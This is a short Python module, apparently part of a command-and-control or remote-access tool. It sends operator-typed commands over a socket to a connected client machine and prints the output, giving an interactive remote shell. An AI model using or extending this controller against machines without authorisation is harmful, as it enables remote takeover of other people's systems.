# commands/rshell.py
import subprocess
import threading

from colorama import Style

from console_handler import command_busy


requires_id = True

argumentError = "Invalid arguments. Usage: rshell <client_id> <command>"

def execute(conn, args, clients, id):
    conn.sendall(b'RSHELL')
    # threading.Thread(target=rshell_thread, args=(conn,), daemon=True).start()
    rshell_thread(conn)
    # command_busy.clear()

def rshell_thread(conn):
    hostname = conn.getpeername()[0]
    while True:
        command = input("<" + hostname + ">:" + Style.RESET_ALL)
        if command.lower() == 'exit':
            # command_busy.clear()
            break
        conn.sendall(command.encode())
        results = b''
        while not results.endswith(b'\n'):
            chunk = conn.recv(1024)
            if not chunk:
                break
            results += chunk
        print("<" + hostname + ">: {}".format(results.decode('utf-8')))
